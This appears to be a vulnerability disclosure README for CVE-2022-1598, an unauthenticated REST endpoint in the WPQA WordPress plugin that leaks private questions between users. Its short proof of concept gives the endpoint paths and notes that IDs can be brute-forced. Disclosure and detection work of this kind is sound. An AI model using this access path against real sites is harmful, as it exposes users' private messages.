# CVE-2022-1598
WPQA &lt; 5.5 - Unauthenticated Private Message Disclosure

# Description
The plugin which is a companion to the Discy and Himer themes, lacks authentication in a REST API endpoint, allowing unauthenticated users to discover private questions sent between users on the site.

## Affected Plugins:
[WPQA < 5.5](https://codecanyon.net/item/wpqa-builder-forms-addon-for-wordpress/25298161)

## Affected Themes:
[DISCY](https://2code.info/discy-social-questions-and-answers-wordpress-theme/)

[HIMER](https://2code.info/himer-social-questions-and-answers-wordpress-theme/)

# Proof of Concept

```
Visit /wp-json/wp/v2/asked-question

or /wp-json/wp/v2/asked-question/<iD> (where ID is numeric and can be bruteforced!) 
```

## Nuclei Template:
[CVE-2022-1598.yaml](CVE-2022-1598.yaml)

## VIDEO POC:
https://www.youtube.com/watch?v=MbhiQKWvivQ

### References:
https://wpscan.com/vulnerability/0416ae2f-5670-4080-a88d-3484bb19d8c8

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1598
